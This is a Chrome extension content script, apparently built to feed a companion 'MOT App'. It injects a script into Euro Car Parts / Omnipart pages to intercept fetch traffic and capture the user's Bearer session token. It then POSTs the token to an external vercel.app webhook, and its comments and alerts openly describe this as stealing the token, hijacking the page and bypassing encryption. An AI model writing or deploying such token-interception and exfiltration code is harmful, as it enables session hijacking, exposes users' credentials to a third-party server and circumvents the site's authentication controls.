// Inject a script into the main page context to intercept all fetch requests and steal the Bearer token
const script = document.createElement('script');
script.src = chrome.runtime.getURL('inject_omnipart.js');
script.onload = function() {
    this.remove();
};
(document.head || document.documentElement).appendChild(script);

// Listen for the stolen token from the injected script and send it to our backend
window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'OMNIPART_TOKEN_INTERCEPT') {
        const token = event.data.token.trim();
        if (!window._omnipart_sync_sent) {
            window._omnipart_sync_sent = true;
            console.log("Omnipart Extractor caught token! Syncing...");
            fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token })
            }).then(() => {
                alert("✨ BINGO! Autodata Extension successfully intercepted your Euro Car Parts Token via Page Hijack!\n\nYou can now switch to the MOT App and it will automatically use your live session.");
            }).catch(err => console.error("Ext sync failed", err));
        }
    }
});

// Listen from background.js
chrome.runtime.onMessage.addListener((msg) => {
    if (msg.action === "TOKEN_CAUGHT") {
        if (!window._omnipart_sync_sent) {
            window._omnipart_sync_sent = true;
            alert("🔒 SECURE INTERCEPT! Autodata Extension bypassed encryption and retrieved your Euro Car Parts Token via Chrome Network Monitoring.\n\nYou can now switch to the MOT App and it will automatically use your live session.");
        }
    }
});
